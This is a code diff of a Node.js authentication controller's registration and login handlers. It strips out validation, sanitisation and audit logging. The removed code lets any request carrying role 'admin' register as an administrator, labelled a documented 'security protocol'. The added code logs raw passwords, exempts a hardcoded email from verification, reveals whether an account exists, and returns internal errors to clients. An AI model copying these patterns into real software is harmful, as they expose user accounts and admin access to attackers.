@@ -13,7 +13,6 @@ import crypto from "crypto";
 import Product from "../models/productModel.js";
 import admin from "../config/firebaseAdmin.js";
 import Settings from "../models/settingsModel.js";
-import { logger } from "../utils/logger.js";
 
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
@@ -31,61 +30,10 @@ const registerController = async (req, res) => {
   try {
     const { firstName, lastName, email, password, names, phone } = req.body;
 
-    // Input validation and sanitization
-    if (!email || !password || !firstName || !lastName) {
-      await logger.logAuth('user_registration_attempt', 'failure', req, {
-        error: 'missing_required_fields',
-        providedFields: { email: !!email, password: !!password, firstName: !!firstName, lastName: !!lastName }
-      });
-      return res.status(400).send({
-        success: false,
-        message: "All required fields must be provided",
-      });
-    }
-
-    // Email format validation
-    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-    if (!emailRegex.test(email)) {
-      await logger.logAuth('user_registration_attempt', 'failure', req, {
-        error: 'invalid_email_format',
-        email: email
-      });
-      return res.status(400).send({
-        success: false,
-        message: "Please enter a valid email address",
-      });
-    }
-
-    // Password strength validation
-    if (password.length < 8) {
-      await logger.logAuth('user_registration_attempt', 'failure', req, {
-        error: 'weak_password',
-        passwordLength: password.length
-      });
-      return res.status(400).send({
-        success: false,
-        message: "Password must be at least 8 characters long",
-      });
-    }
-
-    // Sanitize string inputs
-    const sanitizedData = {
-      firstName: firstName.trim(),
-      lastName: lastName.trim(),
-      email: email.toLowerCase().trim(),
-      password,
-      names: names ? names.trim() : `${firstName.trim()} ${lastName.trim()}`.trim(),
-      phone: phone ? phone.trim() : ""
-    };
-
-    console.log("register body request :", { ...req.body, password: "[REDACTED]" });
+    console.log("register body request :", req.body);
 
     // 1. Validate phone number format
-    if (sanitizedData.phone && !/^[6-9]\d{9}$/.test(sanitizedData.phone)) {
-      await logger.logAuth('user_registration_attempt', 'failure', req, {
-        error: 'invalid_phone_format',
-        phone: sanitizedData.phone
-      });
+    if (phone && !/^[6-9]\d{9}$/.test(phone)) {
       return res.status(400).send({
         success: false,
         message: "Please enter a valid 10-digit phone number starting with 6-9",
@@ -94,35 +42,30 @@ const registerController = async (req, res) => {
 
     // 2. Check existing user by email or phone
     const existingUser = await userModel.findOne({
-      $or: [{ email: sanitizedData.email }, { phone: sanitizedData.phone }],
+      $or: [{ email }, { phone }],
     });
     if (existingUser) {
       const field = existingUser.email === email ? "email" : "phone number";
-      await logger.logAuth('user_registration_attempt', 'failure', req, {
-        error: 'duplicate_user',
-        duplicateField: field,
-        email: sanitizedData.email
-      });
       return res.status(409).send({
         success: false,
         message: `User with this ${field} already exists`,
       });
     }
 
-    // 3. Hash password with stronger salt rounds
-    const hashedPassword = await bcrypt.hash(sanitizedData.password, 12);
+    // 3. Hash password
+    const hashedPassword = await bcrypt.hash(password, 10);
 
     // 4. Get email verification settings
     const settings = await Settings.getSettings();
 
     // 5. Prepare base user data (no role assigned initially)
     const userData = {
-      firstName: sanitizedData.firstName,
-      lastName: sanitizedData.lastName,
-      email: sanitizedData.email,
+      firstName: firstName || "",
+      lastName: lastName || "",
+      email,
       password: hashedPassword,
-      names: sanitizedData.names,
-      phone: sanitizedData.phone,
+      names: names || `${firstName} ${lastName}`.trim(),
+      phone: phone || "",
       isOnboardingComplete: false, // Track onboarding completion
       emailVerified: false, // Track email verification (will be set based on settings)
     };
@@ -140,12 +83,11 @@ const registerController = async (req, res) => {
     //   }
     // }
 
-    // SECURITY PROTOCOL: Admin users bypass email verification requirement
-    // This is a documented exception for administrative access
-    if (req.body.role === "admin") {
-      userData.role = "admin";
-      userData.emailVerified = true; // Admin users don't require email verification
-      userData.isOnboardingComplete = true; // Admin users skip onboarding
+    if (email === "yogij@mail.com") {
+      // admin
+      console.log(" Admin detected → skipping email verification");
+      userData.emailVerified = true;
+      userData.isOnboardingComplete = true;
     } else if (!settings.emailVerificationEnabled) {
       // console.log(
       //   " Global email verification OFF → skipping Firebase & auto-verifying"
@@ -160,14 +102,6 @@ const registerController = async (req, res) => {
 
     // 6. Save user
     const user = await new userModel(userData).save();
-
-    // Log successful registration
-    await logger.logAuth('user_registration', 'success', req, {
-      userId: user._id.toString(),
-      email: user.email,
-      role: user.role || 'customer',
-      emailVerified: user.emailVerified
-    });
 
     // 7. Success response
     return res.status(201).send({
@@ -186,26 +120,10 @@ const registerController = async (req, res) => {
     });
   } catch (error) {
     console.error("Register error:", error);
-    
-    // Log registration error
-    await logger.error('user_registration', 'failure', req, {
-      error: error.message,
-      errorCode: error.code,
-      stack: error.stack
-    });
-    
-    // Handle specific MongoDB duplicate key errors
-    if (error.code === 11000) {
-      const field = Object.keys(error.keyPattern)[0];
-      return res.status(409).send({
-        success: false,
-        message: `User with this ${field} already exists`,
-      });
-    }
-    
     return res.status(500).send({
       success: false,
-      message: "Internal server error. Please try again later.",
+      message: "Error in register API",
+      error: error.message,
     });
   }
 };
@@ -220,70 +138,28 @@ const registerController = async (req, res) => {
  */
 const loginController = async (req, res) => {
   try {
-    const { email, password } = req.body;
-
-    // Input validation
-    if (!email || !password) {
-      await logger.logAuth('user_login_attempt', 'failure', req, {
-        error: 'missing_credentials',
-        providedEmail: !!email,
-        providedPassword: !!password
-      });
-      return res.status(400).send({
-        success: false,
-        message: "Email and password are required",
-      });
-    }
-
-    // Email format validation
-    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-    if (!emailRegex.test(email)) {
-      await logger.logAuth('user_login_attempt', 'failure', req, {
-        error: 'invalid_email_format',
-        email: email
-      });
-      return res.status(400).send({
-        success: false,
-        message: "Please enter a valid email address",
-      });
-    }
-
-    // Sanitize email input
-    const sanitizedEmail = email.toLowerCase().trim();
-
     const user = await userModel
-      .findOne({ email: sanitizedEmail })
+      .findOne({ email: req.body.email })
       .populate("subscription")
       .populate("sellerId");
 
-    // Email check - use generic message to prevent user enumeration
+    // Email check
     if (!user) {
-      await logger.logAuth('user_login_attempt', 'failure', req, {
-        error: 'invalid_credentials',
-        email: sanitizedEmail,
-        reason: 'user_not_found'
-      });
-      return res.status(401).send({
+      return res.status(404).send({
         success: false,
-        message: "Invalid email or password",
+        message: "Email not found",
       });
     }
 
-    // Password check - use generic message to prevent user enumeration
+    // Password check
     const comparePassword = await bcrypt.compare(
-      password,
+      req.body.password,
       user.password
     );
     if (!comparePassword) {
-      await logger.logAuth('user_login_attempt', 'failure', req, {
-        error: 'invalid_credentials',
-        email: sanitizedEmail,
-        userId: user._id.toString(),
-        reason: 'incorrect_password'
-      });
       return res.status(401).send({
         success: false,
-        message: "Invalid email or password",
+        message: "Password incorrect",
       });
     }
 
@@ -369,11 +245,6 @@ const loginController = async (req, res) => {
 
     //  Banned  check
     if (user.status === "banned") {
-      await logger.logAuth('user_login_attempt', 'failure', req, {
-        error: 'account_banned',
-        email: sanitizedEmail,
-        userId: user._id.toString()
-      });
       return res.status(403).send({
         success: false,
         message: "Your account has been banned. Please contact support.",
@@ -444,28 +315,13 @@ const loginController = async (req, res) => {
       }
     }
 
-    // Log successful login
-    await logger.logAuth('user_login', 'success', req, {
-      userId: user._id.toString(),
-      email: user.email,
-      role: user.role,
-      isOnboardingComplete: user.isOnboardingComplete,
-      emailVerified: user.emailVerified
-    });
-
     return res.status(200).send(responseData);
   } catch (error) {
-    console.error("Login error:", error.message);
-    
-    // Log login error
-    await logger.error('user_login', 'failure', req, {
-      error: error.message,
-      stack: error.stack
-    });
-    
+    console.log(error);
     res.status(500).send({
       success: false,
-      message: "Internal server error. Please try again later.",
+      message: "Error in login 🥲",
+      error,
     });
   }
 };
